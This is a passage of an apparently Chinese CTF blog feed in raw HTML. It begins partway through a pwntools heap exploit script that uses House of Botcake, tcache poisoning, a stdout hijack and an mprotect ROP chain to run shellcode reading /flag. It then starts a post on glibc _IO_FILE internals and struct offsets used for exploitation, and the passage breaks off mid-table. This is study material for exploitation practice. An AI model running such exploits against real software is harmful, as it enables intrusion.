class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size=<span class="hljs-number">0x80</span>,data=<span class="hljs-string">&#x27;u&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;Please input size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&#x27;Please input content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Please input idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;Please input idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bkdoor</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">666</span>)<br>    sla(<span class="hljs-string">&#x27;Please input idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(<span class="hljs-number">10</span>-<span class="hljs-number">1</span>-i)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] House of botcake</span><br><span class="hljs-string">[*] Double Free --&gt; Modify chunk&#x27;s size --&gt; Chunk Overlapping</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>bkdoor(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1ecbe0</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>libc.address = libc_base<br>stdout = libc_base + <span class="hljs-number">0x1ed6a0</span><br>stack_addr = libc.sym.environ<br>ret = libc_base + <span class="hljs-number">0x0000000000022679</span><br>rdi = libc_base +<span class="hljs-number">0x0000000000023b6a</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002601f</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x0000000000119211</span><br>jmp_rsi = libc_base + <span class="hljs-number">0x000000000010d5dd</span><br><br>dele(<span class="hljs-number">0</span>)<br>add() <span class="hljs-comment"># 0</span><br><br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x88</span>+p32(<span class="hljs-number">0x90</span>*<span class="hljs-number">8</span>+<span class="hljs-number">1</span>)) <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0x70</span>) <span class="hljs-comment"># 4</span><br>dele(<span class="hljs-number">1</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Tcache Poisoning --&gt; Hijack Stdout --&gt; leak environ addr</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x50</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x91</span>)+p64(stdout)+p64(<span class="hljs-number">0</span>)) <span class="hljs-comment"># 2</span><br>add() <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0x80</span>,p64(<span class="hljs-number">0xfbad1800</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(stack_addr)+p64(stack_addr+<span class="hljs-number">8</span>)*<span class="hljs-number">2</span>) <span class="hljs-comment"># 6</span><br>stack_addr = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Tcache Poinsoning --&gt; Hijack Stack --&gt; ROP --&gt; Shellcode</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">5</span>)<br>dele(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x91</span>)+p64(stack_addr-<span class="hljs-number">0x120</span>)+p64(<span class="hljs-number">0</span>)) <span class="hljs-comment"># 2</span><br>add() <span class="hljs-comment"># 5</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[~] Gets to input more data (Optional)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = flat([<br>    rdi,stack_addr-<span class="hljs-number">0x108</span>,libc.sym.gets<br>])<br>add(<span class="hljs-number">0x80</span>,payload) <span class="hljs-comment"># 7</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Enable Shellcode</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>mmp = flat([<br>    rdi,((stack_addr)&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt;<span class="hljs-number">12</span>,rsi,<span class="hljs-number">0x2000</span>,rdx_r12,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,libc.sym.mprotect,rdi,<span class="hljs-number">0</span>,rsi,stack_addr,rdx_r12,<span class="hljs-number">0x100</span>,<span class="hljs-number">0</span>,libc.sym.read,jmp_rsi<br>])<br>sleep(<span class="hljs-number">0.5</span>)<br>sl(mmp)<br>sleep(<span class="hljs-number">0.5</span>)<br>sl(asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【EP.02】_IO_FILE 艺术鉴赏</title>
    <link href="/posts/13285c73.html"/>
    <url>/posts/13285c73.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>顺风瞎几把 🐑 ，绝境 IOFILE。</p><footer><strong>《 :sheep: 与非 :sheep: 》</strong></footer></blockquote><p>👴 太喜欢这个 IO 玩意了，无敌帅。👴 单方面宣布 <strong>IO</strong> 是 glibc 唯一真神。</p><p>感谢 <strong>风沐云烟</strong> 师傅教我的 IO 一整条利用路线和耐心解答，<strong>风沐沐</strong> 我滴超人。</p><h1>基础知识学习</h1><h2 id="IO-FILE主要结构"><a class="header-anchor" href="#IO-FILE主要结构">¶</a>_IO_FILE主要结构</h2><h3 id="IO-FILE-plus"><a class="header-anchor" href="#IO-FILE-plus">¶</a>_IO_FILE_plus</h3><p>首先是_IO_FILE_plus，每个 _IO_FILE 结构体都被包含在一个 _IO_FILE_plus 结构体之中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>  FILE file;<br>  <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span><span class="hljs-comment">//虚函数表</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>其中的 vtable 是指向一系列函数的一张表， _IO_jump_t 结构体结构如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">&#123;</span><br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy);<br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    <span class="hljs-comment">/* showmany */</span><br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br>&#125;;<br><br><span class="hljs-comment">/* We always allocate an extra word following an _IO_FILE.</span><br><span class="hljs-comment">   This contains a pointer to the function jump table used.</span><br><span class="hljs-comment">   This is for compatibility with C++ streambuf; the word can</span><br><span class="hljs-comment">   be used to smash to a pointer to a virtual function table. */</span><br></code></pre></td></tr></table></figure><h3 id="FILE"><a class="header-anchor" href="#FILE">¶</a>FILE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-type">int</span> _flags;       <span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_file_flags _flags</span><br><br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-type">char</span>* _IO_read_ptr;   <span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span>* _IO_read_end;   <span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span>* _IO_read_base;  <span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_base; <span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_ptr;  <span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span>* _IO_write_end;  <span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_base;   <span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_end;    <span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br><br>  <span class="hljs-type">int</span> _fileno;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  <span class="hljs-type">int</span> _blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">int</span> _flags2;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br><br>  <span class="hljs-comment">/*  char* _save_gptr;  char* _save_egptr; */</span><br><br>  _IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;<br><br><span class="hljs-comment">/* We always allocate an extra word following an _IO_FILE.</span><br><span class="hljs-comment">   This contains a pointer to the function jump table used.</span><br><span class="hljs-comment">   This is for compatibility with C++ streambuf; the word can</span><br><span class="hljs-comment">   be used to smash to a pointer to a virtual function table. */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>  _IO_FILE file;<br>  <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><p>此外，通过 gdb 我们可以很容易的查看某个 FILE 结构体内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; p/x _IO_2_1_stderr_<br>$<span class="hljs-number">1</span> = &#123;<br>  file = &#123;<br>    _flags = <span class="hljs-number">0xfbad2087</span>,<br>    _IO_read_ptr = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_read_end = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_read_base = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_write_base = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_write_ptr = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_write_end = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_buf_base = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_buf_end = <span class="hljs-number">0x7ffff7dce704</span>,<br>    _IO_save_base = <span class="hljs-number">0x0</span>,<br>    _IO_backup_base = <span class="hljs-number">0x0</span>,<br>    _IO_save_end = <span class="hljs-number">0x0</span>,<br>    _markers = <span class="hljs-number">0x0</span>,<br>    _chain = <span class="hljs-number">0x7ffff7dce760</span>,<br>    _fileno = <span class="hljs-number">0x2</span>,<br>    _flags2 = <span class="hljs-number">0x0</span>,<br>    _old_offset = <span class="hljs-number">0xffffffffffffffff</span>,<br>    _cur_column = <span class="hljs-number">0x0</span>,<br>    _vtable_offset = <span class="hljs-number">0x0</span>,<br>    _shortbuf = &#123;<span class="hljs-number">0x0</span>&#125;,<br>    _lock = <span class="hljs-number">0x7ffff7dcf8b0</span>,<br>    _offset = <span class="hljs-number">0xffffffffffffffff</span>,<br>    _codecvt = <span class="hljs-number">0x0</span>,<br>    _wide_data = <span class="hljs-number">0x7ffff7dcd780</span>,<br>    _freeres_list = <span class="hljs-number">0x0</span>,<br>    _freeres_buf = <span class="hljs-number">0x0</span>,<br>    __pad5 = <span class="hljs-number">0x0</span>,<br>    _mode = <span class="hljs-number">0x0</span>,<br>    _unused2 = &#123;<span class="hljs-number">0x0</span> &lt;repeats <span class="hljs-number">20</span> times&gt;&#125;<br>  &#125;,<br>  vtable = <span class="hljs-number">0x7ffff7dca2a0</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>_flags</strong> 这个位置其实比较关键，后面我们要弄清楚怎么设置的才能进入我们想要的函数，完成相关利用。当然伪造的时候我们都是根据具体函数来精心构造的，但特别好用的有俩：<code>0</code> 和 <code>0xfbad1800</code> 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="hljs-comment">/* Magic number */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 <span class="hljs-comment">/* Emulate old stdio. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_BUF 1 <span class="hljs-comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_UNBUFFERED 2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_READS 4 <span class="hljs-comment">/* Reading not allowed */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_WRITES 8 <span class="hljs-comment">/* Writing not allowd */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_EOF_SEEN 0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_ERR_SEEN 0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 <span class="hljs-comment">/* Don&#x27;t call close(_fileno) on cleanup. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_LINKED 0x80 <span class="hljs-comment">/* Set if linked (using _chain) to streambuf::_list_all.*/</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IN_BACKUP 0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_LINE_BUF 0x200</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="hljs-comment">/* Set if put and get pointer logicly tied. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IS_APPENDING 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IS_FILEBUF 0x2000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_BAD_SEEN 0x4000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_LOCK 0x8000</span><br></code></pre></td></tr></table></figure><p><strong>ray-cp</strong> 师傅脚本里偷的结构体的各种偏移：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#ray-cp/pwn_debug/pwn_debug/IO_FILE_plus.py</span><br><br>_IO_FILE_plus_size = &#123;<br><span class="hljs-string">&#x27;i386&#x27;</span>:<span class="hljs-number">0x98</span>,<br><span class="hljs-string">&#x27;amd64&#x27;</span>:<span class="hljs-number">0xe0</span><br>&#125;<br>_IO_FILE_plus = &#123;<br>    <span class="hljs-string">&#x27;i386&#x27;</span>:&#123;<br>        <span class="hljs-number">0x0</span>:<span class="hljs-string">&#x27;_flags&#x27;</span>,<br>        <span class="hljs-number">0x4</span>:<span class="hljs-string">&#x27;_IO_read_ptr&#x27;</span>,<br>        <span class="hljs-number">0x8</span>:<span class="hljs-string">&#x27;_IO_read_end&#x27;</span>,<br>        <span class="hljs-number">0xc</span>:<span class="hljs-string">&#x27;_IO_read_base&#x27;</span>,<br>        <span class="hljs-number">0x10</span>:<span class="hljs-string">&#x27;_IO_write_base&#x27;</span>,<br>        <span class="hljs-number">0x14</span>:<span class="hljs-string">&#x27;_IO_write_ptr&#x27;</span>,<br>        <span class="hljs-number">0x18</span>:<span class="hljs-string">&#x27;_IO_write_end&#x27;</span>,<br>        <span class="hljs-number">0x1c</span>:<span class="hljs-string">&#x27;_IO_buf_base&#x27;</span>,<br>        <span class="hljs-number">0x20</span>:<span class="hljs-string">&#x27;_IO_buf_end&#x27;</span>,<br>        <span class="hljs-number">0x24</span>:<span class="hljs-string">&#x27;_IO_save_base&#x27;</span>,<br>        <span class="hljs-number">0x28</span>:<span class="hljs-string">&#x27;_IO_backup_base&#x27;</span>,<br>        <span class="hljs-number">0x2c</span>:<span class="hljs-string">&#x27;_IO_save_end&#x27;</span>,<br>        <span class="hljs-number">0x30</span>:<span class="hljs-string">&#x27;_markers&#x27;</span>,<br>        <span class="hljs-number">0x34</span>:<span class="hljs-string">&#x27;_chain&#x27;</span>,<br>        <span class="hljs-number">0x38</span>:<span class="hljs-string">&#x27;_fileno&#x27;</span>,<br>        <span class="hljs-number">0x3c</span>:<span class="hljs-string">&#x27;_flags2&#x27;</span>,<br>        <span class="hljs-number">0x40</span>:<span class="hljs-string">&#x27;_old_offset&#x27;</span>,<br>        <span class="hljs-number">0x44</span>:<span class="hljs-string">&#x27;_cur_column&#x27;</span>,<br>        <span class="hljs-number">0x46</span>:<span class="hljs-string">&#x27;_vtable_offset&#x27;</span>,<br>        <span class="hljs-number">0x47</span>:<span class="hljs-string">&#x27;_shortbuf&#x27;</span>,<br>        <span class="hljs-number">0x48</span>:<span class="hljs-string">&#x27;_lock&#x27;</span>,<br>        <span class="hljs-number">0x4c</span>:<span class="hljs-string">&#x27;_offset&#x27;</span>,<br>        <span class="hljs-number">0x54</span>:<span class="hljs-string">&#x27;_codecvt&#x27;</span>,<br>        <span class="hljs-number">0x58</span>:<span class="hljs-string">&#x27;_wide_data&#x27;</span>,<br>        <span class="hljs-number">0x5c</span>:<span class="hljs-string">&#x27;_freeres_list&#x27;</span>,<br>        <span class="hljs-number">0x60</span>:<span class="hljs-string">&#x27;_freeres_buf&#x27;</span>,<br>        <span class="hljs-number">0x64</span>:<span class="hljs-string">&#x27;__pad5&#x27;</span>,<br>        <span class="hljs-number">0x68</span>:<span class="hljs-string">&#x27;_mode&#x27;</span>,<br>        <span class="hljs-number">0x6c</span>:<span class="hljs-string">&#x27;_unused2&#x27;</span>,<br>        <span class="hljs-number">0x94</span>:<span class="hljs-string">&#x27;vtable&#x27;</span><br>    &#125;,<br><br>    <span class="hljs-string">&#x27;amd64&#x27;</span>:&#123;<br>        <span class="hljs-number">0x0</span>:<span class="hljs-string">&#x27;_flags&#x27;</span>,<br>        <span class="hljs-number">0x8</span>:<span class="hljs-string">&#x27;_IO_read_ptr&#x27;</span>,<br>        <span class="hljs-number">0x10</span>:<span class="hljs-string">&#x27;_IO_read_end&#x27;</span>,<br>        <span class="hljs-number">0x18</span>:<span class="hljs-string">&#x27;_IO_read_base&#x27;</span>,<br>        <span class="hljs-number">0x20</span>:<span class="hljs-string">&#x27;_IO_write_base&#x27;</span>,<br>        <span class="hljs-number">0x28</span>:<span class="hljs-string">&#x27;_IO_write_ptr&#x27;</span>,<br>        <span class="hljs-number">0x30</span>:<span class="hljs-string">&#x27;_IO_write_end&#x27;</span>,<br>        <span class="hljs-number">0x38</span>:<span class="hljs-string">&#x27;_IO_buf_base&#x27;</span>,<br>        <span class="hljs-number">0x40</span>:<span class="hljs-string">&#x27;_IO_buf_end&#x27;</span>,<br>        <span class="hljs-number">0x48</span>:<span class="hljs-string">&#x27;_IO_save_base&#x27;</span>,<br>        <span class="hljs-number">0x50</span>:<span class="hljs-string">&#x27;_IO_backup_base&#x27;</span>,<br>        <span class="hljs-number">0x58</span>:<span class="hljs-string">&#x27;_IO_save_end&#x27;</span>,<br>        <span class="hljs-number">0x60</span>:<span class="hljs-string">&#x27;_markers&#x27;</span>,<br>        <span class="hljs-number">0x68</span>:<span class="hljs-string">&#x27;_chain&#x27;</span>,<br>        <span class="hljs-number">0x70</span>:<span class="hljs-string">&#x27;_fileno&#x27;</span>,<br>        <span class="hljs-number">0x74</span>:<span class="hljs-string">&#x27;_flags2&#x27;</span>,<br>        <span class="hljs-number">0x78</span>:<span 